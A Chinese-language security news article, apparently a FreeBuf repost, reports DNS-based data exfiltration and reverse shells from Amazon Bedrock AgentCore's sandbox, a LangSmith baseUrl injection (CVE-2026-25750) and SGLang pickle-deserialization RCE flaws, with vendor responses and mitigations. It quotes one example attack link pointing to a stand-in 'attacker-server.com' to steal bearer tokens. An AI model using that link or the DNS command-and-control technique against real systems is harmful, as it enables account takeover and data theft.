---
title: Amazon Bedrock、LangSmith和SGLang的AI漏洞可致数据泄露与远程代码执行
url: https://mp.weixin.qq.com/s/zEH372PgAIz9V_TWNJSo_A
source: Doonsec's feed
date: 2026-03-20
fetch_date: 2026-03-21T04:01:36.820973
---

# Amazon Bedrock、LangSmith和SGLang的AI漏洞可致数据泄露与远程代码执行

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/icBE3OpK1IX2uibniaeeR6sWEvCsvWLLJC2l4Ea3ibicSuyH6iaSsjLrLC2au2icI9BxpMDic62GrYibvyAGO5kc8egOjPVxRkJiaY1a7fyk9yRlMM94I/0?wx_fmt=jpeg)

# Amazon Bedrock、LangSmith和SGLang的AI漏洞可致数据泄露与远程代码执行

FreeBuf

![]()

在小说阅读器中沉浸阅读

![](https://mmbiz.qpic.cn/mmbiz_gif/qq5rfBadR38jUokdlWSNlAjmEsO1rzv3srXShFRuTKBGDwkj4gvYy34iajd6zQiaKl77Wsy9mjC0xBCRg0YgDIWg/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/icBE3OpK1IX0jqMZr0qcVqJrUtGjD0vJPYCNIUy0mw3a71NH9nSbHmM9VQL8e24s9siaT5luJVngMdW2d58W26oBzibmXHRDZn42rD83XpV7n0/640?wx_fmt=png&from=appmsg)

##

**Part01**

## ****Amazon Bedrock沙盒模式曝DNS数据窃取风险****

网络安全研究人员披露了一种通过域名系统（DNS）查询从AI代码执行环境窃取敏感数据的新方法。BeyondTrust周一发布的报告指出，Amazon Bedrock AgentCore Code Interpreter的沙盒模式允许出站DNS查询，攻击者可利用此特性建立交互式shell并绕过网络隔离。该问题未分配CVE编号，CVSS评分为7.5分（满分10分）。

Amazon Bedrock AgentCore Code Interpreter是2025年8月推出的全托管服务，旨在让AI Agent在隔离沙盒环境中安全执行代码，防止工作负载访问外部系统。BeyondTrust首席安全架构师Kinnaird McQuade表示："尽管配置了'无网络访问'，但该服务允许DNS查询的特性可能使威胁行为者在特定场景下建立命令控制通道，通过DNS实施数据窃取，从而绕过预期的网络隔离控制。"

在实验性攻击场景中，威胁行为者可滥用该特性：通过DNS查询与响应建立双向通信通道；获取交互式反向shell；若其IAM角色具有访问AWS资源（如存储数据的S3存储桶）权限，则可通过DNS查询窃取敏感信息；执行任意命令。

值得注意的是，攻击者还能滥用DNS通信机制向Code Interpreter投递额外载荷，使其轮询DNS命令控制（C2）服务器获取存储在DNS A记录中的指令，执行后通过DNS子域查询返回结果。虽然Code Interpreter需要IAM角色访问AWS资源，但简单的配置疏忽可能导致服务被授予过高权限，从而获得敏感数据的广泛访问权。

BeyondTrust警告称："此研究证明DNS解析可能破坏沙盒代码解释器的网络隔离保证。攻击者可能通过此方法从Code Interpreter的IAM角色可访问的AWS资源窃取敏感数据，导致服务中断、客户敏感信息泄露或基础设施删除。"

## ![](https://mmbiz.qpic.cn/mmbiz_jpg/icBE3OpK1IX26n6uPyUuibM0x7zgNuJ8TgHnb46du52W4HxrIyVicg12CMiapXdIKwd3UeYnXO1XNkMwnKNyZdu1RP3shfJmE84xZDkTnPNtZX4/640?wx_fmt=jpeg&from=appmsg)

## 在2025年9月负责任的披露后，亚马逊认定此为预期功能而非缺陷，建议客户使用VPC模式替代沙盒模式实现完全网络隔离，同时推荐部署DNS防火墙过滤出站DNS流量。Sectigo高级研究员Jason Soroko强调："管理员应清点所有活跃的AgentCore Code Interpreter实例，立即将处理关键数据的实例从沙盒模式迁移至VPC模式。VPC环境支持实施严格的安全组、网络ACL和Route53解析器DNS防火墙，以监控和阻止未经授权的DNS解析。"

##

**Part02**

## ****LangSmith存在账户接管漏洞****

Miggo Security同期披露了LangSmith的高危漏洞（CVE-2026-25750，CVSS评分8.5），可能导致令牌窃取和账户接管。该漏洞影响自托管和云端部署，已在2025年12月发布的0.12.71版本中修复。

该漏洞源于baseUrl参数缺乏验证导致的URL参数注入，攻击者可通过诱导受害者点击特制链接（如smith.langchain[.]com/studio/?baseUrl=https://attacker-server.com）窃取登录用户的Bearer令牌、用户ID和工作区ID。成功利用可未经授权访问AI追踪历史记录，通过审查工具调用暴露内部SQL查询、CRM客户记录或专有源代码。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/icBE3OpK1IX3nNA8AjObtAfbIjdG7rQ6kc13gsFrdsblylIJeWSyScfdn00pHUcAj8zJLBjJxh6MBIz3qEztLV8JHLeNqGvD1R7FuLT2eVxQ/640?wx_fmt=jpeg&from=appmsg)

Miggo研究人员指出："此漏洞提醒我们AI可观测性平台已成为关键基础设施。这些工具在优先考虑开发者灵活性的同时，往往无意间绕过了安全护栏。由于AI Agent与传统软件一样深度访问内部数据源和第三方服务，这种风险更加严重。"

**Part03**

## ****SGLang存在不安全的Pickle反序列化漏洞****

开源大语言模型服务框架SGLang也被发现存在安全漏洞，可能触发不安全的pickle反序列化导致远程代码执行。Orca安全研究员Igor Stepansky发现的三个漏洞目前尚未修复：

* CVE-2026-3059（CVSS评分9.8）：通过ZeroMQ（ZMQ）代理的未认证远程代码执行漏洞，影响SGLang多模态生成模块
* CVE-2026-3060（CVSS评分9.8）：通过解聚合模块的未认证远程代码执行漏洞，影响编码器并行解聚合系统
* CVE-2026-3989（CVSS评分7.8）："replay\_request\_dump.py"中未经验证的不安全pickle.load()函数

![image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/icBE3OpK1IX2cQuUx4fkBGrVic9ibMVu8Q85EEKr5WpiaQQPWE7Kj0fzgc7GV5wdh0WDIz36JE1aWylxA6hGA3CjZMUVoItCH4GKcP3W0ugWXVo/640?wx_fmt=jpeg&from=appmsg)

CERT/CC协调公告指出，当启用多模态生成系统时SGLang易受CVE-2026-3059影响，启用编码器并行解聚合系统时易受CVE-2026-3060影响。建议用户限制服务接口访问权限，确保不暴露于不可信网络，同时实施适当的网络分段和访问控制。虽然尚未发现野外利用，但需监控ZeroMQ代理端口的异常TCP连接、SGLang Python进程生成的异常子进程等可疑活动。

**参考来源：**

AI Flaws in Amazon Bedrock, LangSmith, and SGLang Enable Data Exfiltration and RCE

https://thehackernews.com/2026/03/ai-flaws-in-amazon-bedrock-langsmith.html

---

###

###

###

**推荐阅读**

[![](https://mmbiz.qpic.cn/mmbiz_png/icBE3OpK1IX3cSYwf9JzGtDoYs4CGx2ljpXcZ5TfjHRz5qAcyWh8toRsxBf4Ws4INjebjWXk6Qtea2QViaicbkU4heohT9o1D194ib91F38VGUY/640?wx_fmt=png&from=appmsg)](https://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&mid=2651335912&idx=1&sn=f7c9c36f910a122eb9bb727adcf9e89d&scene=21#wechat_redirect)

### **电报讨论**![](https://mmbiz.qpic.cn/mmbiz_png/icBE3OpK1IX3hCYIDd7a8icmhzic2aMTw0bics6BfDdhRCQCsKTwXSAB6wXtEwI4OK9jdlFfFFNQJa4JUiapxxu56BjXl4gx3LEXYU1GMRkpiawgA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR3ibvNluUKZ6RPy7h2fbYibRbLQDHPFqj89KkFsXBRibx5YTLiaTUfFOy9PKicps3l56iazUPNQrwdhkZ7jA/640?wx_fmt=png&from=appmsg)

**![](https://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR3ibqyrdrvYXibMZM7K7gQW9ymeNepaIkpwPmicPSSoVicLBPXZ3a19uvVicYOjUZOibNeYRbrIOToCHjLAg/640?wx_fmt=png&from=appmsg)**

预览时标签不可点

内容含AI生成图片

阅读原文

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR3ibLOEAnkkKa2dHtqcjZ55KLsqibib6n4UDNUhLIuMRdAJ9ibfZkSK5LViaGJLEQN7p9OGo7mNnVv3EmkQ/0?wx_fmt=png)

FreeBuf

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR3ibLOEAnkkKa2dHtqcjZ55KLsqibib6n4UDNUhLIuMRdAJ9ibfZkSK5LViaGJLEQN7p9OGo7mNnVv3EmkQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过